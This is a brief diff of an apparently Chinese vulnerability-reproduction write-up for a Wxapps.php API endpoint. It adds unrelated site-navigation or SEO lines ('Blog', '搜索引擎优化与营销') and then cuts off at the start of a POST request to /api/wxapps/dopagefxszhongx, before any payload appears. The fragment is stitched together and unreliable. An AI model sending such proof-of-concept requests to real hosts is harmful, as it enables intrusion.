@@ -70,6 +70,14 @@ application/api/controller/Wxapps.php
 
 # 漏洞复现
 
+深入探索
+
+搜索引擎优化与营销
+
+博客资源与服务
+
+Blog
+
 ```
 POST /api/wxapps/dopagefxszhongx HTTP/1.1
 Host: wxapps.mrxn.net
